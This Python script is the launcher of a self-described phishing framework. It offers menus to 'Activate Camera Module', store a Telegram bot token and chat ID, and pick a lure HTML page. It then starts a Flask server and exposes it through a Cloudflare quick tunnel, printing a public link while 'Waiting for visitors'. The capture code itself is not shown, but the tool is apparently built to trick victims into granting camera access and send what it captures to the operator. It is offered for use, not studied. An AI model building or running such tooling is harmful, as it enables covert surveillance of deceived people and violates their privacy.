import os
import json
import subprocess
import time
import re
import sys

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
PORT = "8080"

# ───────── COLORS (GLOBAL) ─────────
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

# ───────── Banner (UNCHANGED ORIGINAL) ─────────
def banner():
    os.system("clear")

    print(GREEN + BOLD + r"""
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
║ ███████╗██████╗      ██████╗ ██╗  ██╗██████╗███████╗██╗  ██╗ ║
║ ██╔══██║  ██╔═╝      ██╔══██╗██║  ██║  ██╔═╝██╔════╝██║  ██║ ║
║ ██████╔╝  ██║        ██████╔╝███████║  ██║  ███████╗███████║ ║
║ ██╔═══╝   ██╚═╗      ██╔═══╝ ██╔══██║  ██╚═╗╚════██║██╔══██║ ║
║ ██║     ██████║      ██║     ██║  ██║██████║███████║██║  ██║ ║
║ ╚═╝       ╚═══╝      ╚═╝     ╚═╝  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ║
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
║        ⚛ SCIENTIFIC PHISHING FRAMEWORK ⚛                     ║
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
║ CODED BY : ཐི༏ཋྀ一Iᴍʀᴀɴ Aғʀɪᴅɪ一ཐི༏ཋྀ                            ║
║ github link : https://github.com/imranafridi999              ║
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
║ FACEBOOK : https://www.facebook.com/Followers.26K      V3.0  ║
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
""" + RESET)

    print(CYAN + "║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║\n" + RESET)

    for c in ["◢", "◣", "◤", "◥"]:
        print(CYAN + f"\rInitializing Neural Modules {c}" + RESET, end="")
        time.sleep(0.15)
    print()

# ───────── Config helpers ─────────
def load_cfg():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}

def save_cfg(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

# ───────── Menu ─────────
def main_menu():
    print(BOLD + WHITE + "[ MAIN CONTROL PANEL ]\n" + RESET)
    print(GREEN + "1) ▶ Activate Camera Module" + RESET)
    print(CYAN  + "2) ⚙ Telegram Configuration" + RESET)
    print(YELLOW + "3) 🌐 Select HTML Page" + RESET)
    print(RED   + "4) ⏻ Exit System\n" + RESET)

def settings_menu():
    print(BOLD + WHITE + "\n[ TELEGRAM SETTINGS ]\n" + RESET)
    print(GREEN + "1) Set Bot Token" + RESET)
    print(CYAN  + "2) Set Chat ID" + RESET)
    print(YELLOW + "3) Back\n" + RESET)

# ───────── Start services ─────────
def start_services():
    print(GREEN + "\n[+] Booting Flask Core..." + RESET)

    # 🔥 FIXED (DEVNULL REMOVED)
    server = subprocess.Popen(
        ["python", os.path.join(BASE_DIR, "server.py")]
    )

    time.sleep(2)

    print(CYAN + "[+] Establishing Cloudflare Quantum Tunnel...\n" + RESET)

    tunnel = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{PORT}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    try:
        for line in tunnel.stdout:
            match = re.search(r"https://[-\w]+\.trycloudflare\.com", line)
            if match:
                print(BOLD + GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + RESET)
                print(CYAN + "PUBLIC LINK:\n" + RESET)
                print(WHITE + match.group() + RESET)
                print(GREEN + "\n👁 Waiting for visitors..." + RESET)
                print(RED + "❌ Press CTRL + C to STOP" + RESET)
                print(BOLD + GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + RESET)
                break

        tunnel.wait()

    except KeyboardInterrupt:
        print(RED + "\n🛑 Shutting down modules..." + RESET)
        for p in (tunnel, server):
            try:
                p.kill()
            except:
                pass
        print(GREEN + "✅ Session closed safely" + RESET)
        sys.exit(0)

# ───────── Main Loop ─────────
while True:
    banner()
    main_menu()
    choice = input(CYAN + "Choose an option ʘ⁠‿⁠ʘ ᗒ⁠ᗒ⁠　" + RESET).strip()

    if choice == "1":
        start_services()

    elif choice == "2":
        while True:
            banner()
            settings_menu()
            cfg = load_cfg()
            s = input(CYAN + "Choose ➤ " + RESET).strip()

            if s == "1":
                cfg["BOT_TOKEN"] = input("\nEnter your bot token : ").strip()
                save_cfg(cfg)
                input(GREEN + "\n✓ Bot token saved\nPress ENTER..." + RESET)

            elif s == "2":
                cfg["CHAT_ID"] = input("\nEnter your chat ID : ").strip()
                save_cfg(cfg)
                input(GREEN + "\n✓ Chat ID saved\nPress ENTER..." + RESET)

            elif s == "3":
                break
            else:
                input(RED + "\nInvalid option. Press ENTER..." + RESET)

    elif choice == "3":
        banner()
        print(BOLD + WHITE + "[ SELECT HTML PAGE ]\n" + RESET)

        for i in range(1, 6):
            print(f"{i}) index{i}.html")

        sel = input(CYAN + "Select ➤ " + RESET).strip()

        if sel in ["1", "2", "3", "4", "5"]:
            cfg = load_cfg()
            cfg["ACTIVE_HTML"] = sel
            save_cfg(cfg)
            input(GREEN + f"\n✓ index{sel}.html selected\nPress ENTER..." + RESET)
        else:
            input(RED + "\nInvalid\nPress ENTER..." + RESET)

    elif choice == "4":
        print(RED + "\n⏻ Exit" + RESET)
        sys.exit(0)

    else:
        input(RED + "\nInvalid option. Press ENTER..." + RESET)
